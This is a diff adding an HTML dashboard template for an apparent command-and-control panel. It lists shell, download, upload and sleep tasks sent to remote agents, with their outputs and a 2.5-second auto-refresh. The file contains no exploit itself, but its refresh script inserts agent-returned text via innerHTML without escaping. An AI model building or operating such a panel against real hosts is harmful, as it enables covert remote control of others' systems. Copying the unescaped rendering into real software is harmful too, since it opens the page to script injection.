@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>All Tasks</title>
+    <link href="{{ url_for('static', filename='css/dashboard.css') }}" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        /* Filter input spacing and horizontal layout */
+        .filter-input {
+            width: 150px;
+            margin-right: 10px;
+        }
+        .filters-wrapper {
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+<body>
+
+<!-- ================= SIDEBAR ================= -->
+<div class="sidebar">
+    <h4>C2 Panel</h4>
+    <a href="{{ url_for('dashboard') }}" class="{% if request.path == url_for('dashboard') %}disabled-link{% endif %}">Dashboard</a>
+    <a href="{{ url_for('agents_list') }}" class="{% if request.path == url_for('agents_list') %}disabled-link{% endif %}">Live Agents</a>
+    <a href="{{ url_for('tasks_list') }}" class="{% if request.path == url_for('tasks_list') %}disabled-link{% endif %}">All Tasks</a>
+    <a href="{{ url_for('uploads_list') }}" class="{% if request.path == url_for('uploads_list') %}disabled-link{% endif %}">Uploaded Files</a>
+    <a href="{{ url_for('logout') }}">Logout</a>
+</div>
+
+<!-- ================= MAIN ================= -->
+<div class="main">
+    <div class="card mb-4">
+        <div class="card-body">
+            <div class="section-title mb-3">All Tasks</div>
+
+            <!-- ===== Filters ===== -->
+            <div class="filters-wrapper">
+                <input type="text" class="form-control filter-input" id="filterAgent" placeholder="Agent ID">
+                <select class="form-select filter-input" id="filterType">
+                    <option value="">All Types</option>
+                    <option value="shell">Shell</option>
+                    <option value="download">Download</option>
+                    <option value="upload">Upload</option>
+                    <option value="sleep">Sleep</option>
+                </select>
+                <select class="form-select filter-input" id="filterStatus">
+                    <option value="">All Status</option>
+                    <option value="completed">Completed</option>
+                    <option value="pending">Pending</option>
+                </select>
+            </div>
+
+            <!-- ===== Tasks Table ===== -->
+            <table class="table table-hover table-bordered" id="tasksTable">
+                <thead class="table-dark">
+                    <tr>
+                        <th>Agent ID</th>
+                        <th>Task Type</th>
+                        <th>Command / URL / Path</th>
+                        <th>Output</th>
+                        <th>UUID</th>
+                        <th>Status</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for uuid, t in tasks.items() %}
+                    <tr class="{% if t.output %}task-completed{% endif %}">
+                        <td>{{ t.agent_id }}</td>
+                        <td>{{ t.task.type }}</td>
+                        <td>{{ t.task.command or t.task.url or t.task.path_to_file or '' }}</td>
+                        <td>{{ t.output or 'Pending' }}</td>
+                        <td>{{ uuid }}</td>
+                        <td>
+                            {% if t.output %}
+                                <span class="badge status-online">Completed</span>
+                            {% else %}
+                                <span class="badge status-offline">Pending</span>
+                            {% endif %}
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+
+        </div>
+    </div>
+</div>
+
+<script>
+    const tableBody = document.getElementById('tasksTable').getElementsByTagName('tbody')[0];
+
+    const filters = ['filterAgent', 'filterType', 'filterStatus'].map(id => document.getElementById(id));
+
+    function applyFilters() {
+        const agentFilter = filters[0].value.toLowerCase();
+        const typeFilter = filters[1].value.toLowerCase();
+        const statusFilter = filters[2].value.toLowerCase();
+
+        for (let row of tableBody.rows) {
+            const agentId = row.cells[0].innerText.toLowerCase();
+            const type = row.cells[1].innerText.toLowerCase();
+            const status = row.cells[5].innerText.toLowerCase();
+
+            if ((agentFilter === '' || agentId.includes(agentFilter)) &&
+                (typeFilter === '' || type === typeFilter) &&
+                (statusFilter === '' || status === statusFilter)) {
+                row.style.display = '';
+            } else {
+                row.style.display = 'none';
+            }
+        }
+    }
+
+    filters.forEach(f => f.addEventListener('input', applyFilters));
+
+    // ===== Auto-refresh table every 2.5 seconds =====
+    async function refreshTasks() {
+        try {
+            const response = await fetch('/tasks-data');
+            const tasks = await response.json();
+
+            tableBody.innerHTML = '';
+
+            for (const [uuid, t] of Object.entries(tasks)) {
+                const row = document.createElement('tr');
+                if (t.output) row.classList.add('task-completed');
+
+                const typeVal = t.task.type || '';
+                const cmdVal = t.task.command || t.task.url || t.task.path_to_file || '';
+                const outputVal = t.output || 'Pending';
+                const statusBadge = t.output
+                    ? '<span class="badge status-online">Completed</span>'
+                    : '<span class="badge status-offline">Pending</span>';
+
+                row.innerHTML = `
+                    <td>${t.agent_id}</td>
+                    <td>${typeVal}</td>
+                    <td>${cmdVal}</td>
+                    <td>${outputVal}</td>
+                    <td>${uuid}</td>
+                    <td>${statusBadge}</td>
+                `;
+                tableBody.appendChild(row);
+            }
+
+            // Re-apply filters after table refresh
+            applyFilters();
+
+        } catch (err) {
+            console.error('Error refreshing tasks:', err);
+        }
+    }
+
+    // Initial refresh and interval
+    refreshTasks();
+    setInterval(refreshTasks, 2500);
+</script>
+
+</body>
+</html>
